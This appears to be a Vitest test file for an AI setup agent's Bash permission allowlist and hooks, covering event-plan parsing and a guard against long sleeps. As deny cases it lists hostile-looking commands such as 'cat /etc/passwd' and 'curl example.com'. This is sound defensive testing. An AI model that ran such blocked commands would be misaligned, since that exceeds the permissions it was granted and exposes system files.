      const result = wizardCanUseTool('Bash', {
        command: 'npm run build 2>&1 | head -n 50',
      });
      expect(result.behavior).toBe('allow');
    });

    it('denies pipe to non-tail/head command', () => {
      const result = wizardCanUseTool('Bash', {
        command: 'npm install | grep error',
      });
      expect(result.behavior).toBe('deny');
    });

    it('denies multiple pipes even ending in tail', () => {
      const result = wizardCanUseTool('Bash', {
        command: 'npm install | grep error | tail -n 5',
      });
      expect(result.behavior).toBe('deny');
    });
  });

  describe('Bash — allowed package manager commands', () => {
    it('allows npm install', () => {
      expect(
        wizardCanUseTool('Bash', { command: 'npm install' }).behavior,
      ).toBe('allow');
    });

    it('allows pnpm add @amplitude/analytics-browser', () => {
      expect(
        wizardCanUseTool('Bash', {
          command: 'pnpm add @amplitude/analytics-browser',
        }).behavior,
      ).toBe('allow');
    });

    it('allows yarn build', () => {
      expect(wizardCanUseTool('Bash', { command: 'yarn build' }).behavior).toBe(
        'allow',
      );
    });

    it('allows go get', () => {
      expect(
        wizardCanUseTool('Bash', { command: 'go get ./...' }).behavior,
      ).toBe('allow');
    });
  });

  describe('Bash — denied commands', () => {
    it('denies arbitrary shell commands', () => {
      expect(
        wizardCanUseTool('Bash', { command: 'cat /etc/passwd' }).behavior,
      ).toBe('deny');
    });

    it('denies npm run dev (not in safe scripts)', () => {
      expect(
        wizardCanUseTool('Bash', { command: 'npm run dev' }).behavior,
      ).toBe('deny');
    });

    it('denies && chaining outside of skill install', () => {
      expect(
        wizardCanUseTool('Bash', {
          command: 'npm install && npm run deploy',
        }).behavior,
      ).toBe('deny');
    });
  });
});

describe('buildWizardMetadata', () => {
  it('returns base variant when no flags are provided', () => {
    const result = buildWizardMetadata({});
    expect(result).toEqual({ VARIANT: 'base' });
  });

  it('returns the matching variant when the flag is set', () => {
    const result = buildWizardMetadata({ 'wizard-variant': 'subagents' });
    expect(result).toEqual({ VARIANT: 'subagents' });
  });

  it('falls back to base variant for an unknown flag value', () => {
    const result = buildWizardMetadata({ 'wizard-variant': 'nonexistent' });
    expect(result).toEqual({ VARIANT: 'base' });
  });

  it('ignores unrelated flags', () => {
    const result = buildWizardMetadata({ 'other-flag': 'value' });
    expect(result).toEqual({ VARIANT: 'base' });
  });
});

describe('parseEventPlanContent', () => {
  it('parses the canonical {name, description} shape', () => {
    const out = parseEventPlanContent(
      JSON.stringify([{ name: 'user signed up', description: 'Fires when…' }]),
    );
    expect(out).toEqual([
      { name: 'user signed up', description: 'Fires when…' },
    ]);
  });

  it('accepts snake_case event_name (observed from the agent in the wild)', () => {
    const out = parseEventPlanContent(
      JSON.stringify([
        {
          event_name: 'External Resource Opened',
          description: 'Fires when a user opens an external link',
          file_path: 'src/app/page.tsx',
        },
      ]),
    );
    expect(out).toEqual([
      {
        name: 'External Resource Opened',
        description: 'Fires when a user opens an external link',
      },
    ]);
  });

  it('accepts camelCase eventName', () => {
    const out = parseEventPlanContent(
      JSON.stringify([{ eventName: 'a', description: 'b' }]),
    );
    expect(out).toEqual([{ name: 'a', description: 'b' }]);
  });

  it('accepts plain "event" key', () => {
    const out = parseEventPlanContent(
      JSON.stringify([{ event: 'a', description: 'b' }]),
    );
    expect(out).toEqual([{ name: 'a', description: 'b' }]);
  });

  it('prefers name when multiple name fields coexist', () => {
    const out = parseEventPlanContent(
      JSON.stringify([
        { name: 'preferred', eventName: 'ignored', event_name: 'ignored' },
      ]),
    );
    expect(out?.[0]?.name).toBe('preferred');
  });

  it('falls back to eventDescriptionAndReasoning when description is missing', () => {
    const out = parseEventPlanContent(
      JSON.stringify([
        { name: 'a', eventDescriptionAndReasoning: 'long form reasoning' },
      ]),
    );
    expect(out?.[0]?.description).toBe('long form reasoning');
  });

  it('returns an empty-string name when no name field is present', () => {
    const out = parseEventPlanContent(JSON.stringify([{ description: 'x' }]));
    expect(out).toEqual([{ name: '', description: 'x' }]);
  });

  it('returns null for invalid JSON', () => {
    expect(parseEventPlanContent('{not json')).toBeNull();
  });

  it('returns null when the payload is not an array', () => {
    expect(parseEventPlanContent('{"name":"x"}')).toBeNull();
  });

  it('tolerates extra unknown fields (looseObject)', () => {
    const out = parseEventPlanContent(
      JSON.stringify([{ name: 'a', description: 'b', file_path: 'x.ts' }]),
    );
    expect(out).toEqual([{ name: 'a', description: 'b' }]);
  });
});

describe('createPreCompactHook', () => {
  const signal = new AbortController().signal;

  it('invokes the handler with normalized trigger and resolves to {}', async () => {
    const handler = vi.fn();
    const hook = createPreCompactHook(handler);

    const out = await hook({ trigger: 'auto' }, undefined, { signal });

    expect(handler).toHaveBeenCalledWith({ trigger: 'auto' });
    expect(out).toEqual({});
  });

  it('forwards manual trigger verbatim', async () => {
    const handler = vi.fn();
    const hook = createPreCompactHook(handler);

    await hook({ trigger: 'manual' }, undefined, { signal });

    expect(handler).toHaveBeenCalledWith({ trigger: 'manual' });
  });

  it('defaults to "auto" when trigger is missing or unrecognized', async () => {
    const handler = vi.fn();
    const hook = createPreCompactHook(handler);

    await hook({}, undefined, { signal });
    await hook({ trigger: 'something-else' }, undefined, { signal });

    expect(handler).toHaveBeenNthCalledWith(1, { trigger: 'auto' });
    expect(handler).toHaveBeenNthCalledWith(2, { trigger: 'auto' });
  });

  it('swallows handler errors so a throw cannot abort compaction', async () => {
    const handler = vi.fn(() => {
      throw new Error('boom');
    });
    const hook = createPreCompactHook(handler);

    await expect(
      hook({ trigger: 'auto' }, undefined, { signal }),
    ).resolves.toEqual({});
    expect(handler).toHaveBeenCalledOnce();
  });
});

describe('createPreToolUseHook', () => {
  const hookOpts = { signal: new AbortController().signal };

  const callHook = (
    toolName: string,
    toolInput: Record<string, unknown>,
  ): Promise<Record<string, unknown>> => {
    const hook = createPreToolUseHook();
    return hook(
      { tool_name: toolName, tool_input: toolInput },
      'tool-use-id',
      hookOpts,
    );
  };

  describe('long sleep guard', () => {
    it(`denies sleep longer than ${MAX_BASH_SLEEP_SECONDS}s (the smoking gun for "API Error: 400 terminated")`, async () => {
      const result = await callHook('Bash', {
        command: 'sleep 30 && echo "ready"',
      });
      expect(result.hookSpecificOutput).toMatchObject({
        hookEventName: 'PreToolUse',
        permissionDecision: 'deny',
      });
      const reason = (
        result.hookSpecificOutput as { permissionDecisionReason: string }
      ).permissionDecisionReason;
      expect(reason).toContain('400 terminated');
    });

    it('denies very long sleep (45s)', async () => {
      const result = await callHook('Bash', {
        command: 'sleep 45 && echo "ready"',
      });
      expect(result.hookSpecificOutput).toMatchObject({
        permissionDecision: 'deny',
      });
    });

    it('denies bare sleep without chain operator', async () => {
      const result = await callHook('Bash', { command: 'sleep 60' });
      expect(result.hookSpecificOutput).toMatchObject({
        permissionDecision: 'deny',
      });
    });

    it(`allows short sleep at threshold (${MAX_BASH_SLEEP_SECONDS}s)`, async () => {
      const result = await callHook('Bash', {
        command: `sleep ${MAX_BASH_SLEEP_SECONDS}`,
      });
      // Falls through to wizardCanUseTool which denies "sleep" as not on
      // allowlist — that's fine. The point of this test is that the
      // sleep-cap branch did NOT fire (would otherwise mention 400 terminated).
      const reason =
        (
          result.hookSpecificOutput as
            | { permissionDecisionReason?: string }
            | undefined
        )?.permissionDecisionReason ?? '';
      expect(reason).not.toContain('400 terminated');
    });

    it('case-insensitive sleep match', async () => {
      const result = await callHook('Bash', { command: 'SLEEP 30' });
      expect(result.hookSpecificOutput).toMatchObject({
        permissionDecision: 'deny',
      });
    });

    it('detects sleep after && chain', async () => {
      const result = await callHook('Bash', {
        command: 'pnpm install && sleep 30',
      });
      expect(result.hookSpecificOutput).toMatchObject({
        permissionDecision: 'deny',
      });
    });

    it('detects sleep on a newline-separated line', async () => {
      const result = await callHook('Bash', {
        command: 'pnpm install\nsleep 60',
      });
      expect(result.hookSpecificOutput).toMatchObject({
        permissionDecision: 'deny',
      });
    });

    it('does not fire on commands that merely contain "sleep" as a substring', async () => {
      const result = await callHook('Bash', {
        command: 'pnpm run sleeptracker',
      });
      const reason =
        (
          result.hookSpecificOutput as
            | { permissionDecisionReason?: string }
            | undefined
        )?.permissionDecisionReason ?? '';
      expect(reason).not.toContain('400 terminated');
    });
  });

  describe('non-Bash tools', () => {
    it('does not block Read', async () => {
      const result = await callHook('Read', { file_path: '/project/foo.ts' });
      expect(result).toEqual({});
    });

    it('does not block MCP tools', async () => {
      const result = await callHook('mcp__amplitude-wizard__get_events', {});
      expect(result).toEqual({});
    });

    it('does not block TodoWrite', async () => {
      const result = await callHook('TodoWrite', { todos: [] });
      expect(result).toEqual({});
    });
  });

  describe('Bash allowlist delegation', () => {
    it('allows pnpm install', async () => {
      const result = await callHook('Bash', {
        command: 'pnpm install @amplitude/unified',
      });
      expect(result).toEqual({});
    });

    it('denies arbitrary shell commands via wizardCanUseTool', async () => {
      const result = await callHook('Bash', { command: 'curl example.com' });
      expect(result.hookSpecificOutput).toMatchObject({
        permissionDecision: 'deny',
      });
    });
  });
});
